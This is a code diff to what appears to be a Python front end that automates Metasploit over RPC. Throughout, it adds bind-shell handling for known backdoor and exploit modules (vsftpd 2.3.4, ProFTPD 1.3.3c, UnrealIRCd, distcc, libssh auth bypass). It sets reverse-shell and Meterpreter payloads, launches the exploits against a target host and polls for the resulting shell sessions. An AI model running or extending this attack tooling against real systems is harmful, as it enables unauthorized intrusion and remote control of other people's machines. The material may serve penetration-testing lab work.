@@ -308,6 +308,7 @@ PAYLOAD_MAP = {
 # Fine-grained overrides (checked first, substring match)
 PAYLOAD_OVERRIDES = {
     "samba":        "cmd/unix/reverse_netcat",
+    # vsftpd 234 backdoor opens a BIND shell on port 6200 — no reverse payload needed
     "vsftpd":       "cmd/unix/interact",
     "ircd":         "cmd/unix/interact",
     "distcc":       "cmd/unix/interact",
@@ -322,6 +323,17 @@ PAYLOAD_OVERRIDES = {
     "rsync":        "cmd/unix/interact",
     "telnet":       "cmd/unix/interact",
     "log4shell":    "linux/x86/meterpreter/reverse_tcp",
+    "proftpd":      "cmd/unix/interact",
+    "libssh":       "cmd/unix/interact",
+}
+
+# Modules that use a BIND shell (they don't need LHOST/LPORT — they open a port on the target)
+BIND_SHELL_MODULES = {
+    "unix/ftp/vsftpd_234_backdoor",
+    "unix/ftp/proftpd_133c_backdoor",
+    "unix/irc/unreal_ircd_3281_backdoor",
+    "unix/misc/distcc_exec",
+    "linux/ssh/libssh_auth_bypass",
 }
 
 
@@ -672,12 +684,16 @@ class MetasploitRPCEngine:
             return
 
         # ── Step 6: Execute ───────────────────────────────
+        is_bind = custom_mod in BIND_SHELL_MODULES
+        exec_mode = "run" if is_bind else "exploit -j -z"
+
         console.print(Panel(
             f"[bold cyan]Deploying Exploit...[/bold cyan]\n"
             f"[white]Target  :[/white] {target}:{rport}\n"
             f"[white]Module  :[/white] {custom_mod}\n"
             f"[white]Payload :[/white] {custom_payload}\n"
-            f"[white]LHOST   :[/white] {lhost}:{lport}",
+            f"[white]LHOST   :[/white] {lhost}:{lport}\n"
+            + ("[yellow]⚡ Bind-shell module — LHOST/LPORT not required[/yellow]" if is_bind else ""),
             border_style="red"
         ))
 
@@ -689,9 +705,14 @@ class MetasploitRPCEngine:
             msf_console.write(f"setg RHOSTS {target}\n")
             msf_console.write(f"setg RHOST {target}\n")
             msf_console.write(f"setg RPORT {rport}\n")
-            msf_console.write(f"setg LHOST {lhost}\n")
-            msf_console.write(f"setg LPORT {lport}\n")
+
+            # Bind-shell modules open a port on the target — they don't need LHOST/LPORT
+            if not is_bind:
+                msf_console.write(f"setg LHOST {lhost}\n")
+                msf_console.write(f"setg LPORT {lport}\n")
+
             msf_console.write(f"set PAYLOAD {custom_payload}\n")
+            time.sleep(0.3)
 
             # ── Local priv-esc: ask for session ID ────────
             mod_lower = custom_mod.lower()
@@ -703,21 +724,29 @@ class MetasploitRPCEngine:
                 if sess_id:
                     msf_console.write(f"set SESSION {sess_id}\n")
 
-            msf_console.write("exploit -j -z\n")
+            # For bind shells we use 'run' (blocking) — it will interact automatically.
+            # For reverse shells we background with -j -z so we can poll for sessions.
+            msf_console.write(f"{exec_mode}\n")
             db.log("MSF-Engine", target,
                    f"Attempted {custom_mod} via Console", "INFO")
 
             console_output = ""
+            stop_tokens = [
+                "Exploit completed", "session opened", "Command shell",
+                "Meterpreter session", "failed", "error", "Handler",
+                "Command shell session", "opened",
+            ]
+
+            # Bind shells need longer — they block until the backdoor responds
+            max_iter = 25 if is_bind else 15
+            sleep_time = 2.0 if is_bind else 1.5
+
             with console.status(
                 "[bold cyan]Executing — capturing MSF output...[/bold cyan]",
                 spinner="dots"
             ):
-                stop_tokens = [
-                    "Exploit completed", "session", "failed",
-                    "Command shell", "found", "error", "Handler"
-                ]
-                for _ in range(15):
-                    time.sleep(1.5)
+                for _ in range(max_iter):
+                    time.sleep(sleep_time)
                     out = msf_console.read()
                     if out and out.get('data'):
                         console_output += out['data']
@@ -728,13 +757,17 @@ class MetasploitRPCEngine:
                 console.print(f"\n[dim]{console_output.strip()}[/dim]")
 
             # ── Session verification ──────────────────────
+            # Give bind shells extra time — the session registers slightly later
+            session_check_iter = 8 if is_bind else 5
+            session_sleep = 2.5 if is_bind else 2.0
+
             with console.status(
                 "[bold cyan]Verifying session status...[/bold cyan]",
                 spinner="bouncingBar"
             ):
                 session_found = False
-                for _ in range(5):
-                    time.sleep(2)
+                for _ in range(session_check_iter):
+                    time.sleep(session_sleep)
                     sessions = self.client.sessions.list
                     if sessions:
                         console.print(
@@ -746,8 +779,11 @@ class MetasploitRPCEngine:
                         break
                 if not session_found:
                     console.print(
-                        "\n[yellow][-] No session yet. Exploit may have failed, "
-                        "target may not be vulnerable, or it needs more time.[/yellow]")
+                        "\n[yellow][-] No session detected after polling.\n"
+                        "    → If output above shows 'Command shell session opened', "
+                        "use the Sessions menu — it may have registered late.\n"
+                        "    → For vsftpd_234_backdoor: confirm target is running "
+                        "vsFTPd 2.3.4 and port 6200 is not firewalled.[/yellow]")
 
         except Exception as e:
             console.print(
